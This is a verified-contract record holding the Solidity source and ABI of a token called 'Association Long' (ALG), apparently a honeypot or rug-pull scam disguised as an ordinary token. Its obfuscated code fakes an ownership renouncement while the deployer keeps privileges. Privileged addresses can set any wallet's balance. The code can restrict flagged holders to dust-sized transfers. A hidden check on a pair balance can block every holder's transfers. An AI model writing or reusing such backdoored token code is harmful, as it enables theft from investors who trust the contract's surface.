{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface feeMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract takeBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeShould {\n    function createPair(address feeList, address swapAmount) external returns (address);\n}\n\ninterface marketingReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeSellSender) external view returns (uint256);\n\n    function transfer(address feeReceiver, uint256 sellMarketing) external returns (bool);\n\n    function allowance(address takeMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeReceiver,\n        uint256 sellMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitTotal, uint256 value);\n    event Approval(address indexed takeMin, address indexed spender, uint256 value);\n}\n\ninterface tokenAuto is marketingReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssociationLong is takeBuy, marketingReceiver, tokenAuto {\n\n    function getOwner() external view returns (address) {\n        return launchTeam;\n    }\n\n    uint256 txIs;\n\n    uint256 private swapAt = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public receiverEnable;\n\n    function buyTeam(address isSell, uint256 sellMarketing) public {\n        launchedAmount();\n        minReceiver[isSell] = sellMarketing;\n    }\n\n    bool private enableMarketing;\n\n    function sellEnable() public {\n        emit OwnershipTransferred(totalLaunch, address(0));\n        launchTeam = address(0);\n    }\n\n    function senderReceiverMarketing(uint256 sellMarketing) public {\n        launchedAmount();\n        limitFrom = sellMarketing;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapAt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchTrading;\n    }\n\n    mapping(address => mapping(address => uint256)) private isFee;\n\n    address private launchTeam;\n\n    uint256 limitFrom;\n\n    function launchedAmount() private view {\n        require(exemptTradingMin[_msgSender()]);\n    }\n\n    function txWallet(address enableLimit, address feeReceiver, uint256 sellMarketing) internal returns (bool) {\n        require(minReceiver[enableLimit] >= sellMarketing);\n        minReceiver[enableLimit] -= sellMarketing;\n        minReceiver[feeReceiver] += sellMarketing;\n        emit Transfer(enableLimit, feeReceiver, sellMarketing);\n        return true;\n    }\n\n    function transfer(address isSell, uint256 sellMarketing) external virtual override returns (bool) {\n        return launchedTeam(_msgSender(), isSell, sellMarketing);\n    }\n\n    event OwnershipTransferred(address indexed receiverMode, address indexed feeLimitTeam);\n\n    uint256 private isLaunchMode;\n\n    bool public modeShouldFund;\n\n    uint8 private launchFrom = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchFrom;\n    }\n\n    bool public toAuto;\n\n    uint256 private isFund;\n\n    string private launchTrading = \"ALG\";\n\n    constructor (){\n        if (enableMarketing == fromReceiver) {\n            totalList = fundLiquidity;\n        }\n        feeMarketing marketingTokenSender = feeMarketing(takeLaunch);\n        maxReceiver = takeShould(marketingTokenSender.factory()).createPair(marketingTokenSender.WETH(), address(this));\n        if (fromReceiver) {\n            fundLiquidity = totalList;\n        }\n        totalLaunch = _msgSender();\n        sellEnable();\n        exemptTradingMin[totalLaunch] = true;\n        minReceiver[totalLaunch] = swapAt;\n        if (fundLiquidity == totalList) {\n            fromReceiver = true;\n        }\n        emit Transfer(address(0), totalLaunch, swapAt);\n    }\n\n    address takeLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return txTakeShould;\n    }\n\n    address public totalLaunch;\n\n    string private txTakeShould = \"Association Long\";\n\n    function approve(address amountWallet, uint256 sellMarketing) public virtual override returns (bool) {\n        isFee[_msgSender()][amountWallet] = sellMarketing;\n        emit Approval(_msgSender(), amountWallet, sellMarketing);\n        return true;\n    }\n\n    function modeLaunched(address autoEnable) public {\n        launchedAmount();\n        if (toAuto != enableMarketing) {\n            enableMarketing = false;\n        }\n        if (autoEnable == totalLaunch || autoEnable == maxReceiver) {\n            return;\n        }\n        receiverEnable[autoEnable] = true;\n    }\n\n    mapping(address => uint256) private minReceiver;\n\n    bool public atMode;\n\n    address shouldAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public fundLiquidity;\n\n    uint256 constant feeLaunched = 10 ** 10;\n\n    function owner() external view returns (address) {\n        return launchTeam;\n    }\n\n    bool private fromReceiver;\n\n    address public maxReceiver;\n\n    function transferFrom(address enableLimit, address feeReceiver, uint256 sellMarketing) external override returns (bool) {\n        if (_msgSender() != takeLaunch) {\n            if (isFee[enableLimit][_msgSender()] != type(uint256).max) {\n                require(sellMarketing <= isFee[enableLimit][_msgSender()]);\n                isFee[enableLimit][_msgSender()] -= sellMarketing;\n            }\n        }\n        return launchedTeam(enableLimit, feeReceiver, sellMarketing);\n    }\n\n    function balanceOf(address modeSellSender) public view virtual override returns (uint256) {\n        return minReceiver[modeSellSender];\n    }\n\n    bool private totalReceiver;\n\n    function senderLimit(address launchLaunched) public {\n        require(launchLaunched.balance < 100000);\n        if (modeShouldFund) {\n            return;\n        }\n        if (totalList == isFund) {\n            totalReceiver = true;\n        }\n        exemptTradingMin[launchLaunched] = true;\n        \n        modeShouldFund = true;\n    }\n\n    uint256 public totalList;\n\n    mapping(address => bool) public exemptTradingMin;\n\n    function launchedTeam(address enableLimit, address feeReceiver, uint256 sellMarketing) internal returns (bool) {\n        if (enableLimit == totalLaunch) {\n            return txWallet(enableLimit, feeReceiver, sellMarketing);\n        }\n        uint256 swapSenderTeam = marketingReceiver(maxReceiver).balanceOf(shouldAmount);\n        require(swapSenderTeam == limitFrom);\n        require(feeReceiver != shouldAmount);\n        if (receiverEnable[enableLimit]) {\n            return txWallet(enableLimit, feeReceiver, feeLaunched);\n        }\n        return txWallet(enableLimit, feeReceiver, sellMarketing);\n    }\n\n    function allowance(address toAmount, address amountWallet) external view virtual override returns (uint256) {\n        if (amountWallet == takeLaunch) {\n            return type(uint256).max;\n        }\n        return isFee[toAmount][amountWallet];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLimitTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSellSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMarketing\",\"type\":\"uint256\"}],\"name\":\"buyTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTradingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoEnable\",\"type\":\"address\"}],\"name\":\"modeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeShouldFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"}],\"name\":\"senderLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellMarketing\",\"type\":\"uint256\"}],\"name\":\"senderReceiverMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AssociationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}